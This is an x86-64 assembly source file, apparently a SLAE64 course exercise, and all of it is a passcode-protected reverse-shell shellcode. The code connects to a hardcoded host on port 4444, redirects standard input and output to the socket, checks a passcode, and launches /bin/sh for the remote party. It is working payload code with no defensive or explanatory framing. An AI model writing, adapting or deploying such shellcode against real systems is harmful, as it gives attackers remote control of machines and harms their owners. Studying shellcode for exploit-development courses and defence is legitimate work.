; Author Andriy Brukhovetskyy - doomedraven - SLAEx64 1322
; 138 bytes

global _start
section .text
_start:

   ;socket syscall
   push byte 0x29 ; 41 socket 
   pop rax    
   push byte 0x2 ; AF_INET
   pop rdi  
   push byte 0x1 ; SOCK_STREAM
   pop rsi    
   cdq ;rdx = 0 - ANY
   syscall
   
   xchg rdi, rax ; save socket descriptor
   
   mov dword [rsp-4], 0x0901a8c0 ; ip
   mov word [rsp-6], 0x5c11      ; port 4444
   mov byte [rsp-8], 0x02
   sub rsp, 8
   
   push byte 0x2a ; connect
   pop rax
   mov rsi, rsp   ; pointer    
   push byte 0x10 ; len
   pop rdx
   syscall

   push byte 0x3; counter 
   pop rsi

dup2_loop:
   dec rsi
   push byte 0x21
   pop rax
   syscall
   jnz dup2_loop ; jump if not 0

   ;read buffer
   mov rdi, rax ; socket
   ;xor rax, rax
   cdq
   mov byte [rsp-1], al ;0 read
   sub rsp, 1
         
   push rdx 
   lea rsi, [rsp-0x10] ; 16 bytes from buf
   add dl, 0x10        ; size_t count
   syscall
   
   ;test passcode
   mov rax, 0x617264656d6f6f64 ; passcode 'doomedra'[::-1].encode('hex')
   push rdi                    ; save the socket
   lea rdi, [rsi]              ; load string from address
   scasq                       ; compare
   jz accepted_passwd          ; jump if equal
   
   ;exit if different :P
   push byte 0x3c 
   pop rax
   syscall

accepted_passwd:
   
   ;execve
   pop rdi; socket
   xor rax, rax
   mov rbx, 0x68732f2f6e69622f ;/bin//sh in reverse
   push rbx
   mov rdi, rsp
   push rax
   mov rdx, rsp
   push rdi 
   mov rsi, rsp
   add al, 0x3b
   syscall
